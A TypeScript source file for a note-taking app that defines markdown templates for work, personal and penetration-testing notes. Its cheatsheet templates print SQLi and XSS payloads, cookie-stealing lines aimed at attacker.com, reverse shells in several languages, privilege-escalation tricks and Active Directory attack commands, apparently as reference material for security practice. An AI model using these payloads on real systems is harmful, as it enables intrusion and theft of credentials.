const ts = () => new Date().toISOString().replace('T', ' ').slice(0, 16);

const TEMPLATES: Record<string, (ts: string) => string> = {
  customer: (ts) => `# Customer Call — [Name]\n\n**Date:** ${ts}\n**Contact Name:**\n**Phone:**\n**Email:**\n**Company / Account:**\n\n---\n\n## Issue / Request\n\n*What did they contact us about?*\n\n---\n\n## Details\n\n*Notes from the conversation…*\n\n---\n\n## Actions Required\n\n- [ ]\n\n---\n\n## Internal Notes\n\n---\n\n## Next Steps\n\n**Follow up by:**\n**Assigned to:**\n`,
  meeting: (ts) => `# Meeting — [Topic]\n\n**Date:** ${ts}\n**Attendees:**\n**Facilitator:**\n**Location / Link:**\n\n---\n\n## Agenda\n\n1.\n2.\n3.\n\n---\n\n## Notes\n\n---\n\n## Decisions Made\n\n-\n\n---\n\n## Action Items\n\n| Task | Owner | Due |\n|------|-------|-----|\n|      |       |     |\n\n---\n\n## Next Meeting\n\n**Date:**\n**Topics:**\n`,
  project: (ts) => `# Project Update — [Project Name]\n\n**Date:** ${ts}\n**Status:** 🟢 On Track / 🟡 At Risk / 🔴 Blocked\n**Owner:**\n**Deadline:**\n\n---\n\n## Summary\n\n---\n\n## Progress This Week\n\n-\n\n---\n\n## Blockers\n\n-\n\n---\n\n## Next Steps\n\n- [ ]\n- [ ]\n- [ ]\n`,
  tasks: (ts) => `# Task List — ${ts}\n\n---\n\n## 🔴 Urgent / Today\n\n- [ ]\n- [ ]\n\n---\n\n## 🟡 This Week\n\n- [ ]\n- [ ]\n- [ ]\n\n---\n\n## 🟢 Backlog\n\n- [ ]\n- [ ]\n\n---\n\n## ✅ Done\n\n-\n`,
  quickthought: (ts) => `# Quick Thought — ${ts}\n\n---\n\n`,
  weekly: (ts) => `# Weekly Review — ${ts}\n\n---\n\n## What went well\n\n-\n\n---\n\n## What could be better\n\n-\n\n---\n\n## Key learnings\n\n-\n\n---\n\n## Next week priorities\n\n- [ ]\n- [ ]\n- [ ]\n`,
  htb: (ts) => `# HTB — Machine Name\n\n> **IP:** \`10.10.x.x\` | **OS:** Linux/Windows | **Difficulty:** Easy/Medium/Hard | **Date:** ${ts}\n\n---\n\n## Enumeration\n\n### Nmap\n\n\`\`\`bash\nnmap -sV -sC -oN nmap/initial 10.10.x.x\n\`\`\`\n\n**Open Ports:**\n\n| Port | Service | Version |\n|------|---------|----------|\n| 22   | SSH     |         |\n| 80   | HTTP    |         |\n\n---\n\n## Credentials\n\n| Username | Password | Service |\n|----------|----------|---------|\n|          |          |         |\n\n---\n\n## Exploitation\n\n\`\`\`bash\n\n\`\`\`\n\n---\n\n## Privilege Escalation\n\n\`\`\`bash\n\n\`\`\`\n\n---\n\n## Flags\n\n- **User:** \`\`\n- **Root:** \`\`\n`,
  webapp: (ts) => `# Web App Recon — Target\n\n> **URL:** \`https://\` | **Date:** ${ts} | **Scope:** Full / Limited\n\n---\n\n## Reconnaissance\n\n\`\`\`bash\n# Directory brute force\nffuf -u https://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt\n\`\`\`\n\n---\n\n## Attack Surface\n\n| Endpoint | Method | Parameters | Notes |\n|----------|--------|------------|-------|\n|          |        |            |       |\n\n---\n\n## Findings\n\n### [Finding 1 — Severity: HIGH]\n\n**Description:**\n\n**PoC:**\n\`\`\`bash\n\n\`\`\`\n\n**Impact:**\n`,
  privesc: (ts) => `# Privilege Escalation — ${ts}\n\n> **Shell:** \`user@hostname\` | **OS:** Linux\n\n---\n\n## Checklist\n\n\`\`\`bash\n# SUID binaries\nfind / -perm -u=s -type f 2>/dev/null\n\n# Sudo permissions\nsudo -l\n\n# Cron jobs\ncat /etc/crontab\n\`\`\`\n\n---\n\n## Vector Found\n\n**Method:**\n\n\`\`\`bash\n\n\`\`\`\n`,
  enum: (ts) => `# Enumeration Notes — ${ts}\n\n---\n\n## Hosts / Ports\n\n| IP | Port | Service | Version | Notes |\n|----|------|---------|---------|-------|\n|    |      |         |         |       |\n\n---\n\n## Credentials Found\n\n| Username | Password / Hash | Service |\n|----------|----------------|---------|\n|          |                |         |\n\n---\n\n## Interesting Files\n\n\`\`\`bash\n\n\`\`\`\n\n---\n\n## Next Steps\n\n- [ ]\n`,
  exploit: (ts) => `# Exploit Notes — ${ts}\n\n---\n\n## Vulnerability\n\n**CVE / Type:**\n**Target:**\n**Version:**\n\n---\n\n## Exploit\n\n\`\`\`bash\n\n\`\`\`\n\n---\n\n## Payload\n\n\`\`\`bash\n\n\`\`\`\n\n---\n\n## Output\n\n\`\`\`\n\n\`\`\`\n`,
  recon: (ts) => `# Recon Report — Target\n\n> **Target:** \`\` | **Date:** ${ts}\n\n---\n\n## Summary\n\n---\n\n## Hosts Discovered\n\n| IP | Hostname | OS | Ports | Notes |\n|----|----------|----|-------|-------|\n|    |          |    |       |       |\n\n---\n\n## DNS / Subdomains\n\n\`\`\`\n\n\`\`\`\n`,
  lab: (ts) => `# Lab Writeup — ${ts}\n\n**Platform:**\n**Lab / Room:**\n**Difficulty:**\n\n---\n\n## Objective\n\n---\n\n## Steps Taken\n\n### 1.\n\n### 2.\n\n---\n\n## Key Learnings\n\n-\n\n---\n\n## Flags / Proof\n\n- **Flag:**\n`,
  journal: (ts) => `# Journal — ${ts}\n\n---\n\n*How am I feeling today?*\n\n---\n\n## What happened\n\n---\n\n## Grateful for\n\n-\n\n---\n\n## Reflection\n\n---\n\n## Plans / intentions\n\n-\n`,
  braindump: (ts) => `# Brain Dump — ${ts}\n\n---\n\n`,
  reminder: (ts) => `# Reminder — ${ts}\n\n**When:**\n**For:**\n\n---\n\n## Details\n\n---\n\n## Action needed\n\n- [ ]\n`,
  idea: (ts) => `# Idea — ${ts}\n\n---\n\n## What is it?\n\n---\n\n## Why does it matter?\n\n---\n\n## How could it work?\n\n---\n\n## Next step\n\n- [ ]\n`,
  studynotes: (ts) => `# Study Notes — ${ts}\n\n**Topic:**\n**Source:**\n\n---\n\n## Key Concepts\n\n-\n\n---\n\n## Notes\n\n---\n\n## Examples\n\n---\n\n## Questions\n\n-\n\n---\n\n## Summary\n\n*In my own words...*\n`,
  general: (ts) => `# Note — ${ts}\n\n---\n\n`,

  // ── Methodology: Pentest Phase Templates ──────────────────────────────────
  webapp_pentest: (ts) => `# Web App Pentest — {{title}}\n\n**Date:** ${ts}\n**Target:** \n**Scope:** \n**Tester:** \n\n---\n\n## Recon\n\n- [ ] WHOIS / DNS enumeration\n- [ ] Subdomain discovery\n- [ ] Technology fingerprinting\n\n\`\`\`bash\nwhatweb <target>\ngobuster dns -d <target> -w subdomains.txt\n\`\`\`\n\n---\n\n## Enumeration\n\n- [ ] Directory brute-force\n- [ ] Parameter fuzzing\n- [ ] Authentication endpoints\n\n\`\`\`bash\nffuf -u https://<target>/FUZZ -w raft-large-directories.txt\n\`\`\`\n\n---\n\n## Exploitation\n\n| Finding | Severity | CVSS | Status |\n|---------|----------|------|--------|\n|         |          |      |        |\n\n---\n\n## Post-Exploitation\n\n- [ ] Privilege escalation\n- [ ] Lateral movement\n- [ ] Data exfiltration assessment\n\n---\n\n## Report Notes\n\n**Executive Summary:**\n\n**Recommendations:**\n- [ ]\n`,

  network_pentest: (ts) => `# Network Pentest — {{title}}\n\n**Date:** ${ts}\n**Target Range:** \n**Scope:** \n\n---\n\n## Discovery\n\n\`\`\`bash\nnmap -sn <cidr> -oN discovery.txt\n\`\`\`\n\n**Live Hosts:**\n\n---\n\n## Port Scan\n\n\`\`\`bash\nnmap -sV -sC -p- --open -oN full_scan.txt <targets>\n\`\`\`\n\n| Host | Port | Service | Version | Notes |\n|------|------|---------|---------|-------|\n|      |      |         |         |       |\n\n---\n\n## Vulnerabilities\n\n| Host | CVE | Description | Exploited |\n|------|-----|-------------|----------|\n|      |     |             |           |\n\n---\n\n## Exploitation\n\n\`\`\`bash\n\n\`\`\`\n\n---\n\n## Recommendations\n\n- [ ]\n`,

  api_testing: (ts) => `# API Testing — {{title}}\n\n**Date:** ${ts}\n**Base URL:** \n**Auth Type:** Bearer / API Key / OAuth\n\n---\n\n## Endpoints Discovered\n\n| Method | Endpoint | Auth Required | Notes |\n|--------|----------|---------------|-------|\n| GET    |          |               |       |\n| POST   |          |               |       |\n\n---\n\n## Authentication Tests\n\n- [ ] JWT manipulation\n- [ ] API key brute force\n- [ ] OAuth flow bypass\n\n---\n\n## IDOR / BAC Testing\n\n\`\`\`bash\n# Change user ID in request\ncurl -H "Authorization: Bearer <token>" https://api/users/2/data\n\`\`\`\n\n---\n\n## Injection Tests\n\n- [ ] SQLi in parameters\n- [ ] NoSQLi\n- [ ] Command injection\n\n---\n\n## Findings\n\n| Endpoint | Vulnerability | Severity |\n|----------|---------------|----------|\n|          |               |          |\n`,

  mobile_testing: (ts) => `# Mobile App Testing — {{title}}\n\n**Date:** ${ts}\n**Platform:** Android / iOS\n**App Version:** \n**Package:** \n\n---\n\n## Static Analysis\n\n- [ ] APK/IPA extraction\n- [ ] Manifest review (permissions, exported components)\n- [ ] Hardcoded secrets\n- [ ] Certificate pinning\n\n\`\`\`bash\napktool d app.apk\ngrep -r "password\\|secret\\|api_key" .\n\`\`\`\n\n---\n\n## Dynamic Analysis\n\n- [ ] SSL/TLS interception (Burp)\n- [ ] Root/jailbreak detection bypass\n- [ ] Traffic analysis\n\n---\n\n## Findings\n\n| Finding | OWASP Mobile Top 10 | Severity |\n|---------|---------------------|----------|\n|         |                     |          |\n`,

  // ── Cheatsheets ───────────────────────────────────────────────────────────
  cs_linux: () => `# Linux Commands Cheatsheet\n\n## File Operations\n\n\`\`\`bash\nls -la                    # List all files with permissions\nfind / -name "*.conf"    # Find files by name\ngrep -r "pattern" /dir   # Recursive grep\nchmod 755 file           # Set permissions\nchown user:group file    # Change ownership\ntar -czf out.tar.gz dir  # Create tarball\n\`\`\`\n\n## Process Management\n\n\`\`\`bash\nps aux                   # All running processes\nkill -9 <pid>            # Force kill process\nnetstat -tulpn           # Open ports\nss -tulpn                # Modern netstat\nlsof -i :80              # Process on port 80\n\`\`\`\n\n## User Management\n\n\`\`\`bash\nid                       # Current user info\nwhoami                   # Username\ncat /etc/passwd          # All users\nsudo -l                  # Sudo permissions\nadduser username         # Add user\n\`\`\`\n\n## Networking\n\n\`\`\`bash\nifconfig / ip a          # Network interfaces\nping -c 4 host           # Ping test\ntraceroute host          # Trace route\ncurl -I https://site     # HTTP headers\nwget -q -O - url         # Download silently\n\`\`\`\n`,

  cs_nmap: () => `# Nmap Cheatsheet\n\n## Basic Scans\n\n\`\`\`bash\nnmap <target>                         # Default scan\nnmap -sV <target>                     # Version detection\nnmap -sC <target>                     # Default scripts\nnmap -sV -sC -oN output.txt <target>  # Full + save\nnmap -p- <target>                     # All 65535 ports\nnmap -p 80,443,8080 <target>          # Specific ports\n\`\`\`\n\n## Scan Types\n\n\`\`\`bash\nnmap -sS <target>   # SYN (stealth) scan\nnmap -sU <target>   # UDP scan\nnmap -sA <target>   # ACK scan (firewall check)\nnmap -sn <cidr>     # Ping sweep (host discovery)\n\`\`\`\n\n## Speed & Evasion\n\n\`\`\`bash\nnmap -T4 <target>           # Aggressive timing\nnmap -T1 <target>           # Slow / stealthy\nnmap -f <target>            # Fragment packets\nnmap --randomize-hosts      # Random host order\nnmap -D RND:5 <target>      # Decoy scan\n\`\`\`\n\n## Output Formats\n\n\`\`\`bash\nnmap -oN normal.txt <target>   # Normal output\nnmap -oX scan.xml <target>     # XML output\nnmap -oG grep.txt <target>     # Grepable output\nnmap -oA all_formats <target>  # All three\n\`\`\`\n`,

  cs_sqli: () => `# SQL Injection Payloads\n\n## Detection\n\n\`\`\`sql\n' OR '1'='1\n' OR 1=1 --\n\" OR \"1\"=\"1\n1' --\n1 AND 1=1\n1 AND 1=2\n\`\`\`\n\n## Union-Based\n\n\`\`\`sql\n' ORDER BY 1--\n' ORDER BY 5--            -- determine columns\n' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT 1,2,3--\n' UNION SELECT table_name,NULL FROM information_schema.tables--\n\`\`\`\n\n## Blind Boolean\n\n\`\`\`sql\n' AND 1=1--               -- true\n' AND 1=2--               -- false\n' AND SUBSTRING(username,1,1)='a'--\n' AND (SELECT COUNT(*) FROM users)>0--\n\`\`\`\n\n## Time-Based Blind\n\n\`\`\`sql\n'; IF (1=1) WAITFOR DELAY '0:0:5'--   -- MSSQL\n' AND SLEEP(5)--                       -- MySQL\n' AND pg_sleep(5)--                    -- PostgreSQL\n\`\`\`\n\n## Error-Based\n\n\`\`\`sql\n' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--\n' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--\n\`\`\`\n`,

  cs_xss: () => `# XSS Payloads\n\n## Basic Probes\n\n\`\`\`html\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\"><script>alert(1)</script>\n'><script>alert(1)</script>\n\`\`\`\n\n## Filter Bypass\n\n\`\`\`html\n<ScRiPt>alert(1)</ScRiPt>\n<script >alert(1)</script >\n<img src=x onerror=\"alert(1)\">\n<body onload=alert(1)>\n<details open ontoggle=alert(1)>\n<input autofocus onfocus=alert(1)>\n\`\`\`\n\n## DOM-Based\n\n\`\`\`javascript\n#<img src=x onerror=alert(1)>\njavascript:alert(1)\ndata:text/html,<script>alert(1)</script>\n\`\`\`\n\n## Exfiltration\n\n\`\`\`html\n<script>document.location='https://attacker.com/?c='+document.cookie</script>\n<img src=x onerror=\"fetch('https://attacker.com/'+btoa(document.cookie))\">\n\`\`\`\n\n## CSP Bypass\n\n\`\`\`html\n<script src=\"https://allowed-cdn.com/callback?payload=alert(1)\"></script>\n<link rel=import href=\"data:text/html,<script>alert(1)</script>\">\n\`\`\`\n`,

  cs_revshells: () => `# Reverse Shells\n\n> Replace LHOST and LPORT with your values.\n\n## Listener Setup\n\n\`\`\`bash\nnc -lvnp 4444\nrlwrap nc -lvnp 4444   # With arrow key support\n\`\`\`\n\n## Bash\n\n\`\`\`bash\nbash -i >& /dev/tcp/LHOST/LPORT 0>&1\n/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'\n\`\`\`\n\n## Python\n\n\`\`\`python\npython3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n\`\`\`\n\n## Netcat\n\n\`\`\`bash\nnc -e /bin/sh LHOST LPORT\nnc LHOST LPORT | /bin/sh | nc LHOST LPORT2   # no -e version\n\`\`\`\n\n## PowerShell\n\n\`\`\`powershell\n$client = New-Object System.Net.Sockets.TCPClient(\"LHOST\",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2=$sendback+\"PS \"+(pwd).Path+\"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\n\`\`\`\n\n## Shell Upgrade\n\n\`\`\`bash\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Ctrl+Z, then:\nstty raw -echo; fg\nexport TERM=xterm\n\`\`\`\n`,

  cs_privesc: () => `# Privilege Escalation Cheatsheet\n\n## Linux Enumeration\n\n\`\`\`bash\nid && whoami\nuname -a\ncat /etc/os-release\nsudo -l\ncat /etc/crontab\nfind / -perm -4000 -type f 2>/dev/null  # SUID\nfind / -perm -2000 -type f 2>/dev/null  # SGID\nfind / -writable -type f 2>/dev/null    # World-writable\ncap_setuid+ep                           # Capabilities: getcap -r / 2>/dev/null\n\`\`\`\n\n## Common Vectors\n\n\`\`\`bash\n# SUID /bin/bash\nbash -p\n\n# Writable /etc/passwd\necho 'hacker:$(openssl passwd hacked):0:0::/root:/bin/bash' >> /etc/passwd\n\n# Writable cron job\necho '/bin/bash -i >& /dev/tcp/LHOST/LPORT 0>&1' >> /path/to/cronjob.sh\n\n# PATH hijack — if sudo PATH includes writable dir\nexport PATH=/tmp:$PATH\necho '/bin/bash -p' > /tmp/vulnerable_binary\nchmod +x /tmp/vulnerable_binary\n\`\`\`\n\n## Automated Scanners\n\n\`\`\`bash\ncurl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\nwget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh && bash lse.sh -l 1\n\`\`\`\n\n## Windows\n\n\`\`\`powershell\nwhoami /priv\nnet localgroup Administrators\nwmic service list brief | findstr \"Running\"\npowerup.ps1 (PowerSploit)\nwinpeas.exe\n\`\`\`\n`,

  cs_ad: () => `# Active Directory Attacks\n\n## Enumeration\n\n\`\`\`powershell\nGet-ADDomain\nGet-ADUser -Filter *\nGet-ADComputer -Filter *\nGet-ADGroup -Filter *\nGet-ADGroupMember \"Domain Admins\"\n\`\`\`\n\n\`\`\`bash\n# BloodHound\nbloodhound-python -d domain.local -u user -p pass -c All\n\n# ldapsearch\nldapsearch -H ldap://DC -x -D \"user@domain\" -w pass -b \"DC=domain,DC=local\"\n\`\`\`\n\n## Credential Attacks\n\n\`\`\`bash\n# Kerberoasting\nimpacket-GetUserSPNs domain.local/user:pass -request -outputfile spns.txt\nhashcat -m 13100 spns.txt rockyou.txt\n\n# AS-REP Roasting\nimpacket-GetNPUsers domain.local/ -no-pass -usersfile users.txt\n\n# Pass-the-Hash\nimpacket-psexec domain/user@target -hashes :NTLM_HASH\n\n# DCSync\nimpacket-secretsdump -just-dc domain/user:pass@DC\n\`\`\`\n\n## Lateral Movement\n\n\`\`\`bash\nimpacket-psexec domain/user:pass@target\nimpacket-wmiexec domain/user:pass@target\nevil-winrm -i target -u user -p pass\n\`\`\`\n\n## Persistence\n\n\`\`\`powershell\n# Golden Ticket (Mimikatz)\nkerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt\n\`\`\`\n`,
};

export const TEMPLATES_BY_MODE: Record<string, string[]> = {
  work      : ['customer', 'meeting', 'project', 'tasks', 'quickthought', 'weekly'],
  cyber     : ['htb', 'webapp', 'privesc', 'enum', 'exploit', 'recon', 'lab'],
  personal  : ['journal', 'braindump', 'reminder', 'idea', 'studynotes', 'general'],
  pentest   : ['webapp_pentest', 'network_pentest', 'api_testing', 'mobile_testing'],
  cheatsheet: ['cs_linux', 'cs_nmap', 'cs_sqli', 'cs_xss', 'cs_revshells', 'cs_privesc', 'cs_ad'],
};

export const TEMPLATE_LABELS: Record<string, string> = {
  customer       : '📞 Customer Call',
  meeting        : '👥 Meeting Notes',
  project        : '📊 Project Update',
  tasks          : '✅ Task List',
  quickthought   : '💭 Quick Thought',
  weekly         : '📅 Weekly Review',
  htb            : '🎯 HTB Machine',
  webapp         : '🌐 Web App Recon',
  privesc        : '⬆️ PrivEsc Checklist',
  enum           : '🔍 Enumeration',
  exploit        : '💉 Exploit Notes',
  recon          : '🔭 Recon Report',
  lab            : '🧪 Lab Writeup',
  journal        : '📓 Journal Entry',
  braindump      : '🧠 Brain Dump',
  reminder       : '🔔 Reminder',
  idea           : '💡 Idea',
  studynotes     : '📚 Study Notes',
  general        : '📝 General Note',
  webapp_pentest : '🌐 Web App Pentest',
  network_pentest: '🔌 Network Pentest',
  api_testing    : '🔗 API Testing',
  mobile_testing : '📱 Mobile Testing',
  cs_linux       : '🐧 Linux Commands',
  cs_nmap        : '🗺️ Nmap Cheatsheet',
  cs_sqli        : '💉 SQLi Payloads',
  cs_xss         : '🕸️ XSS Payloads',
  cs_revshells   : '🔙 Reverse Shells',
  cs_privesc     : '⬆️ Privilege Escalation',
  cs_ad          : '🏢 Active Directory',
};

export function getTemplate(key: string): string {
  const fn = TEMPLATES[key];
  return fn ? fn(ts()) : `# Note — ${ts()}\n\n---\n\n`;
}
